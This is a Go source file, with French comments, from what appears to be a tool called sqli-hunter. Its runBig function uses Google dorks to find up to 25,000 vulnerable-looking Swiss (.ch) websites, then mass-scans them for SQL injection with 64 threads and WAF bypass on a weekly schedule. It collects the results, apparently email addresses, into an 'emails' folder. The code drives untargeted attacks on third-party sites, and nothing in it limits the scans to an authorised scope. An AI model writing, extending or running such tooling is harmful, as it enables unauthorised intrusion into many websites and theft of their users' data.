package main

import (
	"context"
	"fmt"
	"os"
	"os/signal"
	"path/filepath"
	"syscall"

	"github.com/sqli-hunter/sqli-hunter/internal/notify"
	"github.com/sqli-hunter/sqli-hunter/internal/output"
	"github.com/sqli-hunter/sqli-hunter/internal/results"
)

// runBig lance une grosse passe discover + scan (hebdo / bi-mensuel).
// Dorks vuln + signatures DBMS (MySQL, MSSQL, PostgreSQL, Oracle, Access, …).
func runBig(args []string) {
	cfg, err := parseBigArgs(args)
	if err != nil {
		fmt.Fprintf(os.Stderr, "erreur: %v\n", err)
		os.Exit(1)
	}

	printer := output.New(cfg.noColor, cfg.verbose)
	printer.Header(version)
	printer.KV("mode", "big — passe lourde DBMS + vuln (.ch)")
	printer.KV("discover", "dorks complets + erreurs DB (rotation hebdo)")
	printer.KV("limit", fmt.Sprintf("%d urls", cfg.discoverLimit))
	printer.KV("threads", fmt.Sprintf("%d", cfg.urlConcurrency))
	printer.KV("scan", "full + waf bypass")
	printer.KV("output", cfg.outputDir+"/emails/")
	printer.Rule()
	fmt.Println()

	n := notify.Default()
	notify.DailyLaunch(n, cfg.discoverLimit, cfg.urlConcurrency, cfg.outputDir)
	_ = results.WriteRunStatus(cfg.outputDir, results.RunStatus{Phase: "big"})

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigCh
		printer.Warning("interruption")
		cancel()
	}()

	cfg.discoverDomain = "ch"
	cfg.discoverSource = "google"
	cfg.discoverSubs = true
	cfg.discoverOutput = filepath.Join(cfg.outputDir, "scope_big.txt")
	cfg.skipScanned = false
	cfg.allowEmptyDiscover = true
	cfg.bigScan = true

	scopeFile, count, err := discoverURLs(ctx, cfg, printer)
	if err != nil {
		if n.Enabled() {
			n.Error("Discover big: " + err.Error())
		}
		printer.Error(err.Error())
		os.Exit(1)
	}
	if count == 0 {
		printer.Warning("Aucune URL nouvelle sur cette passe big")
		printEmailStock(printer, cfg.outputDir)
		return
	}

	cfg.listFile = scopeFile
	applyMassDefaultsToConfig(&cfg, count)
	cfg.massMode = true

	if err := executeScan(ctx, cfg, printer); err != nil {
		if n.Enabled() {
			n.Error("Scan big: " + err.Error())
		}
		printer.Error(err.Error())
		os.Exit(1)
	}

	printEmailStock(printer, cfg.outputDir)
}

func parseBigArgs(args []string) (config, error) {
	scanArgs := append([]string{
		"-D", "ch", "--mass", "--full", "--waf",
		"--url-threads", "64",
		"--discover-limit", "25000",
	}, args...)
	return parseArgs(scanArgs)
}

// runWeekly alias de big (même pipeline).
func runWeekly(args []string) {
	runBig(args)
}
